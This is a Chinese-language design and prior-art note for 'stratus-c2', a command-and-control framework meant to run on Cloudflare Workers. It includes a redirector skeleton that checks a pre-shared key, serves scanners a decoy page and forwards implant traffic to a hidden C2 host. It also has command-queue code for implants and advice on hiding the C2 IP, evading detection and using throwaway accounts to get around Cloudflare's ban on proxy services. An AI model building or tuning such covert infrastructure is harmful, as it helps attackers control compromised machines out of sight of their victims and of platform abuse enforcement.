# 05 · Cloudflare 上的 C2 / 隧道 / 跳板：既有实践（prior art）

> 用途：给 stratus-c2（`workers/gateway` + `workers/console` + `clients/go` / `clients/dotnet`）判断——
> **哪些 C2 能力可以真的架在 Cloudflare 上，哪些必须砍掉或换方案。**
>
> 数据快照：**2026-11-03**。配额数字全部来自当日实抓的官方文档（链接见 §7），未标来源的数字标 `估算`。
> 星数来自 GitHub Search API 当日抓取。`C2_HOST` / `WORKER_ENDPOINT` / `DOMAIN` 为占位符。

---

## 0. 结论速览

| # | 结论 | 影响 |
|---|---|---|
| 1 | "Worker 当重定向器"是 2021 年就成熟的做法（ajpc500 的原始文章），至今仍是主流：Worker 收请求 → 校验 → `fetch()` 转发到真实 C2 | gateway 用 Worker 前置可行 |
| 2 | Cloudflare **不支持域前置**：SNI 与 `Host` 不一致时 CF 直接返回 `421`；能借的只有 `*.workers.dev` 的域名信誉 | 别在方案里写"域前置" |
| 3 | Cloudflare Tunnel **不能**替代 VPS：`cloudflared` 必须跑在你控制的常驻主机上，它替代的是"公网 IP + 端口映射 + 证书"，不是服务器 | "零自建服务器"下 Tunnel 无意义 |
| 4 | Worker 上的 socks5 / vless / trojan 全部靠 **WebSocket 上传自定义协议**绕过"没有入站 TCP"，代价是客户端必须有本地代理进程 + 每条连接都在烧请求/CPU | 做不了"通用 socks5 网关" |
| 5 | 平台红线是**账号级**的：`ToS §2.2.1(j)` 明文禁止把服务当 VPN/代理用；实测案例里 Worker 上线 15 分钟被 abuse 自动 disable，账号被永久打标 | 主账号绝不碰代理类代码 |
| 6 | 纯 CF 的"命令下发队列"里，只有 **Durable Object** 能同时满足"强一致 + 推送 + 低延迟"；KV 有 30s 级缓存下限，D1 单库单线程，Queues 只能服务端消费 | 会话状态必须放 DO |
| 7 | 免费版（100k 请求/天、10ms CPU/请求）只够 60~70 台设备 60s 心跳；任何"隧道级"流量都必须上 Workers Paid | 定价模型按 Paid 算 |

---

## 1. 用 Cloudflare Worker 当 C2 重定向器 / 前置

### 1.1 公开项目与文章

| 项目 / 文章 | URL | 做法（一句话） | 局限 |
|---|---|---|---|
| **ajpc500《Using Cloudflare Workers as Redirectors》**（2021-01，事实上的起源文章） | https://ajpc500.github.io/c2/Using-CloudFlare-Workers-as-Redirectors/ | Worker 把入站请求 URI 拼到 `TS`（目标 C2）后面 `fetch()` 转发；用一个自定义头 `X-Custom-PSK` 做预共享校验，头不对就返回良性 JSON | 单向 HTTP 轮询模型；无 WS；未处理 `Host`/`X-Forwarded-For` 语义；`workers.dev` 域名进不了白名单环境 |
| **ASkyeye/Cloudflare-Redirector** | https://github.com/ASkyeye/Cloudflare-Redirector | 上文的工程化版本：**Havoc** + Worker + **Cloudflare Tunnel** + Zero Trust **Service Token**（`CF-Access-Client-Id/Secret`）；Worker 校验服务令牌后转发到绑了 tunnel 的 listener 域名 | 需要在 C2 侧跑 `cloudflared`；Service Token 泄漏即等于入口泄漏；示例 profile 是 Havoc 的 `.yaotl` |
| **pantha704/sliver-c2** | https://github.com/pantha704/sliver-c2 | 一键 Sliver 基础设施：常驻 Worker redirector + implant 构建 + 多设备 failover；Worker 层做 UA/path 过滤后转发 | 强绑定 Sliver 的 HTTP(S) profile；README 面向"一条命令起全套"，可审计性差 |
| **errantpacket/Oblique-Relay** | https://github.com/errantpacket/Oblique-Relay | Worker 侧按 C2 profile 校验（method/path/header 指纹），命中才转发，其余一律返回诱饵页 | 规则写死在 Worker 里，改 profile 要重新部署 |
| **nightingalephillip/CloudflareDirector** | https://github.com/nightingalephillip/CloudflareDirector | 极简 Worker redirector 集合（多 C2 各一份） | 无维护、无校验逻辑 |
| **only9464/VEIL** | https://github.com/only9464/VEIL | 直接把 **C2 本体**放 Worker 上（HTTP 任务队列形态），不转发 | 无长连接、无文件通道，能力上限见 §6 |
| **Kxiandaoyan/github-C2** | https://github.com/Kxiandaoyan/github-C2 | 双通道：Worker 主通道 + GitHub Issue 备用通道；Rust agent + Web 控制台 | 依赖 GitHub 作为备份信道，两条信道都要维护 |
| Mythic（框架本身） | https://github.com/its-a-feature/Mythic | **没有官方 Worker 支持**；社区做法是 socket-based profile + Worker WS 反代（ASkyeye 仓库的 fork 对比里可见 `mythic-socket` 配置形态） | 需要 Worker 侧透传 WS upgrade，属 §1.3 的能力边界 |
| Cobalt Strike（框架本身） | — | 无官方支持；靠 malleable profile 适配 Worker 转发（ajpc500 文中给出的 `http-get`/`http-post` 片段即标准做法） | profile 与 Worker 校验逻辑必须成对维护 |

> 观察：**Havoc / Sliver / CS 的公开实践都是"HTTP 单向轮询 + Worker 转发"**，Mythic 才有 WS 需求。
> 也就是说，"Worker 前置"这件事在工程上早已解决，真正的难点不在转发，而在 §4 的平台风险与 §5 的状态存储。

### 1.2 三种前置形态

| 形态 | Worker 做什么 | 优点 | 代价 |
|---|---|---|---|
| **A. 纯路径透传** | `fetch(new Request(C2_HOST + path, req))` | 10 行代码，任何 HTTP C2 都能挂 | 无鉴权，扫到就是入口；被动的指纹扫描会打穿 |
| **B. 指纹校验 + 诱饵** | 校验 method/path/header/UA 组合，不匹配返回静态页 | 扫描器看到的是正常站点；可叠加多套 profile | 规则变更要重新部署；规则写错就断线 |
| **C. WS 长连反代** | `Upgrade: websocket` → `WebSocketPair` → 与上游 WS 桥接 | 支持 Mythic socket / 自定义二进制协议；延迟低 | 需要 DO 或长生命周期 invocation；受 §1.3 各项限制 |

形态 B 的最小骨架（脱敏版，`PSK` 走 `wrangler secret`，不要写进 `vars`）：

```ts
// workers/gateway/src/redirector.ts（示例骨架）
export default {
  async fetch(req: Request, env: Env): Promise<Response> {
    const url = new URL(req.url);
    const psk = req.headers.get("x-psk");
    const okPath = /^\/(api|static)\//.test(url.pathname);
    if (psk !== env.PSK || !okPath) {
      return new Response(DECOY_HTML, { headers: { "content-type": "text/html" } });
    }
    const upstream = new URL(url.pathname + url.search, env.C2_HOST);
    const fwd = new Request(upstream, {
      method: req.method,
      headers: req.headers,          // 注意：Host 会被 fetch 重写为 upstream.host
      body: req.body,
      redirect: "manual",
    });
    return fetch(fwd);
  },
};
```

两个必须知道的细节：

1. Worker 里 `fetch()` 到外部域名时，`Host` 由目标 URL 决定，原始 `Host` 需要自己塞进 `X-Forwarded-Host` 之类的头，否则后端 vhost 会判错。
2. Worker 对**同 zone** 的自打自请求有额外约束（`fetch()` 打自己 zone 的 Worker 会失败，需走 Custom Domain 或 Service Binding），见 §4.4。

### 1.3 Worker 反代 WebSocket：可行性边界

| 能力 | 现状（2026-11 文档口径） | 出处 |
|---|---|---|
| 接受 WS upgrade | 支持（`WebSocketPair` / `response.webSocket`） | Workers WebSockets |
| WS 连接寿命 | HTTP 触发的 invocation 无 wall-time 上限，"客户端连着就一直算"；但**运行时升级时旧进程只给 20 分钟 grace**，之后连接被终止 | Workers Limits §Duration / §Runtime updates |
| 单条 WS 消息大小 | DO 侧接收上限 **32 MiB**（仅接收方向） | DO Limits |
| 出站并发连接 | 每次 invocation **最多 6 条**处于"等响应头"阶段的连接，`connect()` 与 `fetch()` 共用这个池 | Workers Limits §Simultaneous open connections |
| 出站 subrequest | 免费 **50**/invocation，付费默认 10,000（可调到 10M） | Workers Limits §Subrequests |
| 出站 TCP | 有 `cloudflare:sockets` 的 `connect({hostname, port})`，可裸 TCP/TLS | Workers TCP sockets |
| 入站 TCP | **没有**。Worker 只能被 HTTP(S)/WS 触发 | 平台模型 |

结论：**WS 反代在技术上成立**，但要接受三件事——
(a) 一次转发链路里的每次拨号都吃 6 连接池；(b) 心跳/重连逻辑必须自己写（runtime 升级会周期性掐连接）；
(c) 想长期持连就必须把连接挂在 Durable Object 上（普通 Worker 的 invocation 语义不适合做"连接注册表"）。

### 1.4 域前置（domain fronting）现状

| 做法 | 结论 |
|---|---|
| 自定义域做 SNI，`Host` 写别人的域名 | **不可行**。CF 在 SNI 与 `Host` 不一致时直接返回 `421 Misdirected Request`（官方 troubleshooting 明写"最常见原因就是 SNI mismatch"） |
| 借 `*.workers.dev` 的域名信誉 | 可用但廉价：`workers.dev` 是公开后缀，大量安全产品直接按后缀封禁（ajpc500 文中也把"监控 workers.dev 出网"当成首选检测点） |
| TLS 1.3 + ECH | 与 CF 侧无关：ECH 只加密 ClientHello 里的 SNI，CF 仍需按 SNI 选证书/路由，`Host` 不匹配照样 421 |
| "真域前置"（借大厂 CDN 边缘） | 2026 年基本绝迹：主流 CDN 都做了 SNI/Host 一致性校验；Praetorian 那篇《Domain Fronting is Dead》系列讲的就是这条路的演化 |

**因此**：stratus 的 gateway 只能定位成"**借 Cloudflare 域名信誉 + 隐藏真实 C2 IP**"，
不要在任何文档/UI 里把它写成"域前置"。真实收益是：目标侧看到的是 `*.workers.dev` 或你自有域名的 CF 边缘 IP。

---

## 2. Cloudflare Tunnel（cloudflared）能否替代自建 VPS

### 2.1 Tunnel 到底提供了什么

| 项 | 说明 |
|---|---|
| 连接方向 | `cloudflared` 从源站**主动出站**连到 CF 边缘，源站不需要公网 IP / 开放入站端口 |
| 域名 | 命名隧道需要一个托管在 CF 的 zone（自定义 hostname → CNAME 到 `<UUID>.cfargotunnel.com`） |
| 常驻进程 | **必须**。`cloudflared` 挂了入口就没了，要自己上 systemd / k8s / 容器编排 |
| 鉴权 / 访问控制 | 可选 Cloudflare Access（Zero Trust，免费档 50 用户）；也可用 Service Token 做机器认证 |
| 临时隧道 | `trycloudflare.com` quick tunnel：无需账号、随机域名、进程退出即失效 |
| 谁终止 TLS | **CF 边缘**。到源站那段是 tunnel 内部的加密通道，但 CF 侧能看到明文 HTTP |

### 2.2 三种"入口"组合对比

| 方案 | 需要自建什么 | 月成本 | 真实暴露面 | 结论 |
|---|---|---|---|---|
| A. 自建 VPS + nginx | VPS 一台 | $3~5 | VPS IP（可被扫、可被封） | 传统做法，可控性最好 |
| B. 任意常驻主机 + `cloudflared` | **一台常驻主机（家宽/NAS/小机器都行）** | 0（+ 域名） | 无入站端口，只有 CF 边缘 | 替代的是"公网 IP + 端口映射 + 证书"，**没有替代服务器** |
| C. 纯 Worker（无源站） | 无 | 0~5 | 只有 CF 边缘 | 真正的"零服务器"，但能力被 §6 砍到只剩任务队列 |

### 2.3 直接结论

> **在"零自建服务器"前提下，Cloudflare Tunnel 不是可行项，而是自相矛盾项。**
> 因为 Tunnel 的一端必须是"你控制的、能跑 `cloudflared` 的常驻主机"——那已经是一台服务器了；
> 它省掉的是公网 IP、端口映射、证书、DDoS 清洗，不是主机。
>
> 想真正做到零服务器，只有一条路：**C2 本体跑在 Worker/DO 上**，此时 Tunnel 完全不需要。

补充两条实践事实：

1. Tunnel 的滥用面已被安全厂商大规模标记（钓鱼/木马用 quick tunnel 做落地页，见 CSO 2026 报道），
   所以"用 trycloudflare 域名当 C2 入口"在检测侧基本等于自曝；命名隧道 + 自有域名才有意义。
2. Tunnel 的 `421` 也是常见坑：ingress 规则里的 hostname 与请求 `Host` 不一致会 421（官方 troubleshooting 明列）。

---

## 3. Workers 上的反向代理 / socks5 / 端口转发

### 3.1 公开项目

| 项目 | 星 | 形态 | 如何绕过"没有入站 TCP" | 配额消耗特征 |
|---|---|---|---|---|
| [yonggekkk/Cloudflare-vless-trojan](https://github.com/yonggekkk/Cloudflare-vless-trojan) | 16.7k | VLESS-ws / Trojan-ws 节点（Workers + Pages），另带本地 socks5/http 客户端脚本 | 客户端本地起代理 → 把 VLESS/Trojan 封进 **WS** → Worker 解出目标 → `connect()` 出站 | 每条 TCP 连接 ≈ 1 次 WS 会话；加解密吃 CPU（免费版 10ms 是硬伤） |
| [6Kmfi6HP/EDtunnel](https://github.com/6Kmfi6HP/EDtunnel) | 3.1k | EDtunnel 系（vless/trojan + 订阅生成） | 同上，协议头自己解析 | 同左；且代码指纹被平台侧识别（见 §4.2） |
| [amclubs/am-cf-tunnel](https://github.com/amclubs/am-cf-tunnel) | 3.2k | EDtunnel 改造版 + 订阅转换 | 同上 | 同上 |
| [Misaka-blog/cf-wkrs-pages-vless](https://github.com/Misaka-blog/cf-wkrs-pages-vless) | 716 | vless 节点 + Clash/Sing-box 订阅 | 同上 | 同上 |
| [PAICNI/CFBox](https://github.com/PAICNI/CFBox) | 686 | 上面的"管理面板"版（KV 存配置、延迟测试） | 同上 | 面板本身也吃 KV 写配额 |
| [Ridter/cf_workers_proxy](https://github.com/Ridter/cf_workers_proxy) | 91 | **真 socks5**：本地 socks5 → Worker | 自定义"目标地址 + 数据"帧格式走 WS | 每连接 1 次 upgrade + 持续 WS 帧 |
| [git20188/CF-Worker-Socks](https://github.com/git20188/CF-Worker-Socks) | — | socks5 + 本地 Go 客户端，协议文档完整（首帧 JSON `{hostname,port,psw}`） | 同上，且对 CF 自家 IP 走直连省流 | 同上 |
| [Vozec/Flarex](https://github.com/Vozec/Flarex) | 17 | socks5 / HTTP CONNECT，**多 Worker 轮询**分摊 | 每条出站连接分给池里某个 Worker | 摊薄单账号请求量，但账号数量线性增长 |
| [serverless-proxy/serverless-proxy](https://github.com/serverless-proxy/serverless-proxy) | 89 | HTTP→TCP 代理（Workers + Deno Deploy） | 同上 | 同上 |
| [workerindex/tcproxy](https://github.com/workerindex/tcproxy) | 4 | 给 VLESS 用的透明 TCP 代理 | 同上 | 同上 |
| [latentharbor/tunnelfetch](https://github.com/latentharbor/tunnelfetch) | 12 | 在 Worker 里用 JS 实现 TLS1.2/1.3，通过 HTTP CONNECT/socks5 打洞 | 纯用户态 TLS（因为 runtime 无法校验被隧道的对端） | CPU 最贵的一类 |

### 3.2 三条技术路线

| 路线 | 机制 | 适用 | 硬限制 |
|---|---|---|---|
| **WS 上跑自定义帧** | 客户端本地监听 socks5 → 首帧带 `{host,port}` → Worker `connect()` | 内网穿透、单目标转发 | 每条 TCP 一次 WS，6 并发连接池，免费版 CPU 10ms |
| **VLESS/Trojan over WS** | 复用现成协议栈（xray/sing-box 客户端） | 已有客户端生态，不想写协议 | 加解密 CPU；代码指纹被平台识别（§4.2） |
| **HTTP CONNECT / 长轮询打洞** | 用 `fetch` 流式 body 双向搬字节 | 无法升级 WS 的环境 | 延迟高，每次往返都是一次请求（免费 100k/天 很快烧完） |

`connect()` 出站的最小示例：

```ts
import { connect } from "cloudflare:sockets";

const sock = connect({ hostname: "TARGET_HOST", port: 443 }, { secureTransport: "on" });
await sock.opened;                       // 建连失败会在这里抛
const writer = sock.writable.getWriter();
await writer.write(new Uint8Array([...]));
```

`connect()` 的硬限制（官方 Considerations 节，逐条实抓）：

| 限制 | 说明 |
|---|---|
| 目标地址白名单外一律拒绝 | **Cloudflare 自家 IP 段、`localhost`、私网 IP 全部禁止**（报错 `proxy request failed, cannot connect to the specified address`） |
| 不能在全局作用域创建 | 只能在 `fetch` / `scheduled` / `queue` / `alarm` 里建 socket |
| 计入 6 连接池 | 每个 socket 都占"同时在等响应头"的名额 |
| DO 内的 socket 会续命 DO | DO 里开的 socket 会让对象最多 **15 分钟**持续计费，之后按常规驱逐 |
| 25 端口封禁 | 不能直连 SMTP |
| 自连检测 | 连回自己会报 `TCP Loop detected` |

> 这一条对 stratus 很关键：**Worker 永远摸不到靶标内网**（私网 IP 直接被拒），
> 想"从 Cloudflare 打内网"只有一条路——由植入体/操作员侧客户端主动出站做代理端，Worker 只做公网转发。

### 3.3 配额账本（决定"能不能当隧道用"）

| 资源 | 免费 | 付费 | 折算到隧道场景 |
|---|---|---|---|
| 请求数 | 100,000/天 | 不限 | 60s 心跳的设备：**1440 次/天/台** → 免费版约 69 台封顶（还要留给 console） |
| CPU/请求 | **10 ms** | 5 min（默认 30 s） | VLESS 加解密 + 大 payload 解析很容易超 10ms → 免费版直接 1102 |
| 出站并发 | 6 | 6 | 一条 WS 反代链路里同时拨号 6 个以上目标就会排队 |
| Subrequest | 50 | 10,000 | 一次"下载一个文件"若按片轮询，50 次就撞墙 |
| WS 消息 | 32 MiB/条（接收） | 同 | 传文件必须自己切片 |
| 请求体大小 | Free/Pro **100 MB** | Business 200 MB | 单次上传上限（域名的 CF 套餐决定，不是 Workers 套餐） |
| 静态资源 | 20k 文件 / 单文件 25 MiB | 100k / 25 MiB | SPA 打包产物完全够 |

### 3.4 为什么它做不了"通用 socks5 网关"

1. **客户端必须有本地代理进程**：浏览器不会说"WS 上的自定义帧"，所以要装 Go/CLI 或配 Proxifier（见 CF-Worker-Socks 的 README）。
2. **没有入站 UDP** → DNS over UDP、QUIC、游戏/语音类流量全部出局。
3. **6 条并发连接**是硬闸门：一个网页 30 个并发请求就会排队，体验上是"能通但很慢"。
4. **免费版 CPU 10ms** 让"加密隧道"变成 CPU 赌博；付费版才有意义。

---

## 4. 平台红线与已知踩坑

### 4.1 条款原文（Self-Serve Subscription Agreement §2.2.1）

抓自 https://www.cloudflare.com/terms/ （当日快照）：

- **(b)** 不得"create an undue burden on the Services"，包括让被 CF 代理的域名流量指向"非 CF 分配的 IP"；
- **(c)** 不得以"违反或意图绕开 Service-specific usage limits、配额或其他限制"的方式使用服务；
- **(j)** 不得"use the Services to provide a virtual private network or other similar proxy services"。

> 翻译成人话：**"在 Worker 上做代理/VPN"本身就是条款禁止项**，不是"流量大了才违规"。
> 这条也是所有 vless-worker 项目必然被清退的根因。

### 4.2 封号案例时间线（公开复盘）

来源：[How deploying a proxy Worker permanently marks your Cloudflare account](https://laither.com/en/posts/2026/05/how-deploying-a-proxy-worker-permanently-marks-your-cloudflare-account/)（2026-05）

| 时刻 | 事件 |
|---|---|
| T+0 | 全新 Worker，粘贴 edgetunnel 系 VLESS-over-WS 片段，Deploy |
| T+15min | 收到 abuse 报告邮件，Worker 被自动 disable（`workers.dev` 返回 000），附带 16 位 report id |
| 之后 | 同账号再部署同类代码 → **保存阶段直接失败**；删除重建、换 Worker 名、换网络都无效 |
| 结论 | 检测是**账号级 + 代码指纹级**（`connect({hostname,port})`、VLESS 头、WS 转发模式、开源项目签名），不是 IP 级 |

同一篇的"同账号仍然安全"清单值得抄进 stratus 的运维手册：DNS 托管、Pages 静态站、
**Tunnel 反连自家服务器（官方认可）**、非代理类 Worker（API 网关/表单/定时任务）、R2/Queues/DO 都不触发。

### 4.3 踩坑对照表

| 现象 | 触发条件 | 依据 | 规避 |
|---|---|---|---|
| Worker 突然全部 403/停用，邮箱收到 abuse 邮件 | 代理/VPN 类代码，或高频转发第三方流量 | ToS §2.2.1(j) | 主账号零代理代码；实验用可弃账号；C2 只做"自有设备回连"，不做"帮第三方转发" |
| `1102 Worker exceeded resource limits` | 单请求 CPU 超限（免费 10ms / 付费默认 30s） | [Workers Limits §CPU](https://developers.cloudflare.com/workers/platform/limits/) | 大 payload 分片；重计算挪 DO；付费版 `limits.cpu_ms` 上调 |
| `1027` 错误页 / 请求被绕过 | 免费版 100k 请求/天用尽 | 同上 §Daily requests | 心跳 ≥60s；请求合并；上 Paid |
| `1015 You are being rate limited` | 自家 WAF/rate limiting 规则打到自己的 Worker 流量 | [Error 1015](https://developers.cloudflare.com/support/troubleshooting/http-status-codes/cloudflare-1xxx-errors/error-1015/) | 给 gateway 路径建 skip 规则；Bot Fight Mode 对 API 路径放行 |
| `421 Misdirected Request` | SNI ≠ `Host`；Tunnel ingress hostname 不匹配 | [Error 421](https://developers.cloudflare.com/support/troubleshooting/http-status-codes/4xx-client-error/error-421/) | 别做域前置；ingress 规则与域名严格对齐 |
| `SQLITE_BUSY` / `overloaded` | D1 单库单线程，热点行并发写 | [D1 Limits](https://developers.cloudflare.com/d1/platform/limits/) | 写操作串行化（走 DO），或按设备分库 |
| KV 写入静默丢失/延迟 | 同 key **1 写/秒**；免费 **1,000 写/天**；`cacheTtl` 最小 **30s** | [KV Limits](https://developers.cloudflare.com/kv/platform/limits/) | KV 只存配置/低频状态；命令队列不要用 KV |
| WS 周期性断线 | 运行时升级，旧进程 20 分钟 grace 后终止连接 | Workers Limits §Runtime updates | 客户端指数退避重连 + 应用层补发（见前端文档 §5） |
| 上传大文件 413 | 域名的 CF 套餐限制（Free/Pro 100MB） | Workers Limits §Request body | 前端直传 R2（预签名），不经 Worker |
| SPA 深链 404 | 未配 `assets.not_found_handling` | [Workers Static Assets SPA](https://developers.cloudflare.com/workers/static-assets/routing/single-page-application/) | `not_found_handling: "single-page-application"` |

### 4.4 "自己打自己"的隐藏坑

- Worker 里 `fetch()` 打**同 zone** 的另一个 Worker 会失败（除非走 Custom Domain 或 Service Binding）——gateway → console 的内部调用请用 **Service Binding**。
- Service Binding 共享同一个"6 条并发连接"预算，链路越深越容易排队。
- Worker 出站到自己的 zone 会**重新经过 WAF**：一旦开了 Managed Rules / Bot Fight Mode，自己的 beacon 会被当机器人拦掉，症状是"本地 curl 通、线上 403"。做法：`/api/*` 走 skip 规则，或干脆拆到独立 zone。

---

## 5. 纯 CF 实现"命令下发队列"的模式对比

### 5.1 总表

| 模式 | 一致性 | 下发延迟 | 免费额度 | 付费成本 | 适合 | 主要坑 |
|---|---|---|---|---|---|---|
| **KV 轮询** | 最终一致（边缘缓存，`cacheTtl` 最小 30s） | **30s 级** | 100k 读/天、1k 写/天 | $0.50/M 读、$5/M 写（估算档） | 配置下发、灰度开关 | 同 key 1 写/秒；写完立刻读可能读到旧值 |
| **D1 轮询** | 强一致（单库单线程） | 轮询间隔 | 5M 行读/天、100k 行写/天、500MB | 按行计费 | 审计日志、任务历史 | 热点行写冲突；单查询 30s 上限；结果 50MB 上限 |
| **DO + WS 推送** | 强一致（单对象串行） | **毫秒级** | 免费版可用（SQLite backend） | 请求 + 时长 + 存储 | **会话/命令主通道** | 单对象软上限 ~1000 rps；对象会被驱逐，需 hibernation/重连 |
| **DO alarm** | 强一致 | 定时触发（最小粒度受平台限制） | 同上 | 同上 | 超时重投、租约回收、定时任务 | 每个对象只有**一个** alarm；handler wall-time 15 min |
| **Queues** | 至少一次（可重试 + DLQ） | 秒级 | 10k 操作/天 | $0.40/M 操作（1M 含） | 服务端扇出、批量任务 | 浏览器**不能**直接消费；只能 consumer 再推给 DO |
| **Cache API** | 无（**每 colo 独立**） | — | 免费 | 计入请求 | 诱饵页缓存、静态响应 | 不能当队列：不同 colo 看到不同数据 |
| **R2 对象轮询** | 读己之写 | 轮询间隔（~50–150ms/次） | 10M Class B/月、1M Class A/月、10GB | $0.36/M 读、$4.5/M 写 | 文件/大结果回传、离线补投 | `list()` 是 Class A，轮询会烧 A 类额度 |

### 5.2 逐项要点

**KV 轮询**（只适合"配置/低频指令"）

```ts
// gateway: 设备拉配置
const cfg = await env.CFG.get(`dev/${deviceId}`, { cacheTtl: 30 }); // 注意：30s 是最小值
```
- 写入侧：同一 key 1 写/秒 → "每台设备一个 key"没问题，"全局一个 key"必然被限流。

**D1 轮询 + 租约**（把"取任务"做成一次原子 UPDATE）

```ts
const row = await env.DB.prepare(
  `UPDATE tasks SET state='leased', lease_until=?1
     WHERE id = (SELECT id FROM tasks
                  WHERE device_id=?2 AND state='queued'
                  ORDER BY id LIMIT 1)
   RETURNING id, payload`
).bind(Date.now() + 30_000, deviceId).first();
```
- 这套写法在 D1 上会把压力集中到同一批行；设备数上千后必须按 `device_id` 分库或改走 DO。

**Durable Object：会话主通道（推荐）**

```ts
export class DeviceHub implements DurableObject {
  constructor(private state: DurableObjectState, private env: Env) {}
  async fetch(req: Request) {
    const pair = new WebSocketPair();
    this.state.acceptWebSocket(pair[1]);          // hibernation 可用
    await this.state.storage.setAlarm(Date.now() + 30_000);
    return new Response(null, { status: 101, webSocket: pair[0] });
  }
  async webSocketMessage(ws: WebSocket, msg: ArrayBuffer) { /* 上行帧 */ }
  async alarm() { /* 未 ack 的命令重投 + 续租 */ }
}
```
- 一个 DO 实例 = 一台设备（或一个运维会话）→ 天然串行、天然强一致，不用锁。
- 用 `acceptWebSocket` + hibernation，空闲长连接不持续计费（计费口径以 DO 计费页为准）。

**Queues：只做服务端扇出**

```ts
export default {
  async queue(batch: MessageBatch<Cmd>, env: Env) {
    for (const m of batch.messages) {
      const stub = env.HUB.get(env.HUB.idFromName(m.body.deviceId));
      await stub.fetch("https://do/push", { method: "POST", body: JSON.stringify(m.body) });
      m.ack();
    }
  },
};
```
- 浏览器不能消费 Queue → "设备离线时把命令攒着"这件事必须落在 DO/R2/D1 上。

**R2 轮询**（大结果回传的兜底）

```ts
const list = await env.BLOB.list({ prefix: `out/${deviceId}/`, limit: 20 }); // Class A
```

### 5.3 选型决策（照抄进 ADR 即可）

1. 有设备在线 → **DO + WS 推送**（主通道，毫秒级）。
2. 设备离线 → DO 里排队；超过 N 小时/超过 M 条 → 落 R2 或 D1，等设备上线补投。
3. 需要"服务端主动扇出给多个会话" → **Queues → DO RPC**。
4. 配置/开关/白名单 → **KV**（接受 30s 级延迟）。
5. 审计、命令历史、检索 → **D1**（只追加，不做热点更新）。
6. Cache API **不进**数据链路，只用于诱饵页。

---

## 6. 结论：哪些 VShell 能力在纯 CF 上必须砍掉

| # | 能力 | 处置 | 原因 |
|---|---|---|---|
| 1 | **通用 socks5 / 端口转发 / 内网穿透** | **砍** | 无入站 TCP + 6 并发连接 + ToS §2.2.1(j) 三重否决；做出来也只是"能通但很慢"的翻墙工具 |
| 2 | **UDP 类能力**（DNS 隧道、ICMP、QUIC） | **砍** | 平台无入站 UDP，Worker 只能出站 HTTP/TCP |
| 3 | **域前置 / 真源站隐藏** | **砍** | SNI≠Host → 421；只能借 `workers.dev` 信誉，安全产品按后缀封 |
| 4 | **原始 TCP 会话（meterpreter 式裸 socket）** | **砍** | 只能改造成"WS 上的应用层帧"，语义必然变化 |
| 5 | **高吞吐交互式 PTY（>数百 KB/s）** | **降级** | 免费 10ms CPU、付费也有 6 连接池 + 32MiB 消息上限；改成"命令级 RPC + 分片输出" |
| 6 | **内网扫描 / 横向（大量并发连接）** | **砍** | 60 次并发就要排队；一次扫描会把 subrequest 与连接池打穿 |
| 7 | **Worker 中转的大文件上传/下载** | **改造** | 走 R2 预签名直传 + 分片；Worker 只签名与记账 |
| 8 | **秒级心跳 / 长轮询保活** | **砍** | 免费 100k/天 ≈ 69 台设备；改 60s 心跳 + 事件驱动 |
| 9 | **永久长连接（不重连）** | **砍** | runtime 升级 20 分钟 grace 后必断；必须有重连 + 序号补发 |
| 10 | **多副本无状态一致性队列** | **改造** | 只有 DO 能串行化；跨区域强一致只能靠单对象，注意 ~1000 rps 软上限 |

保留下来的能力集合（也就是 stratus 在纯 CF 上能讲的故事）：
**设备注册/心跳 → 命令队列（DO）→ 结果回传（DO 小结果 / R2 大结果）→ 文件投递（R2 分片）→ 审计（D1）**，
外加 gateway 侧的"Worker 前置 + 指纹校验 + 诱饵页"，以及 console 侧的 SPA 静态资源。

---

## 7. 参考链接

平台文档（当日实抓，`.md` 后缀可直接取纯文本版）

1. Workers Limits（CPU/请求/subrequest/并发/静态资源）：https://developers.cloudflare.com/workers/platform/limits/
2. Workers Static Assets · SPA 路由：https://developers.cloudflare.com/workers/static-assets/routing/single-page-application/
3. KV Limits（1 写/秒、1k 写/天、cacheTtl 30s）：https://developers.cloudflare.com/kv/platform/limits/
4. D1 Limits（单线程、10GB、30s 查询、50MB 结果）：https://developers.cloudflare.com/d1/platform/limits/
5. Durable Objects Limits（32MiB WS、10GB/对象、30s CPU、alarm 15min）：https://developers.cloudflare.com/durable-objects/platform/limits/
6. Queues Pricing（免费 10k 操作/天、$0.40/M）：https://developers.cloudflare.com/queues/platform/pricing/
7. R2 Pricing（10GB/1M A/10M B 免费、出网免费）：https://developers.cloudflare.com/r2/pricing/
8. Workers TCP sockets：https://developers.cloudflare.com/workers/runtime-apis/tcp-sockets/
9. Error 421（SNI mismatch / Tunnel ingress 不匹配）：https://developers.cloudflare.com/support/troubleshooting/http-status-codes/4xx-client-error/error-421/
10. Error 1015（限流）：https://developers.cloudflare.com/support/troubleshooting/http-status-codes/cloudflare-1xxx-errors/error-1015/
11. Cloudflare Tunnel 概览：https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/
12. 条款 · Self-Serve Subscription Agreement §2.2.1：https://www.cloudflare.com/terms/

实践文章 / 项目

13. ajpc500, *Using Cloudflare Workers as Redirectors*（2021）：https://ajpc500.github.io/c2/Using-CloudFlare-Workers-as-Redirectors/
14. ASkyeye/Cloudflare-Redirector（Havoc + Worker + Tunnel + Service Token）：https://github.com/ASkyeye/Cloudflare-Redirector
15. pantha704/sliver-c2（Worker redirector + Sliver）：https://github.com/pantha704/sliver-c2
16. errantpacket/Oblique-Relay（profile 校验 + decoy）：https://github.com/errantpacket/Oblique-Relay
17. yonggekkk/Cloudflare-vless-trojan（16.7k）：https://github.com/yonggekkk/Cloudflare-vless-trojan
18. 6Kmfi6HP/EDtunnel：https://github.com/6Kmfi6HP/EDtunnel
19. Ridter/cf_workers_proxy（worker socks5）：https://github.com/Ridter/cf_workers_proxy
20. git20188/CF-Worker-Socks（协议文档完整）：https://github.com/git20188/CF-Worker-Socks
21. Vozec/Flarex（多 Worker 池摊薄）：https://github.com/Vozec/Flarex
22. latentharbor/tunnelfetch（用户态 TLS 打洞）：https://github.com/latentharbor/tunnelfetch
23. Laither, *How deploying a proxy Worker permanently marks your Cloudflare account*（2026-05）：https://laither.com/en/posts/2026/05/how-deploying-a-proxy-worker-permanently-marks-your-cloudflare-account/
24. CSO Online, *Phishing campaign abuses Cloudflare Tunnels*（quick tunnel 滥用）：https://www.csoonline.com/article/4009636/phishing-campaign-abuses-cloudflare-tunnels-to-sneak-malware-past-firewalls.html
25. Praetorian, *Domain Fronting is Dead. Long Live Domain Fronting*：https://www.praetorian.com/blog/domain-fronting-is-dead-long-live-domain-fronting
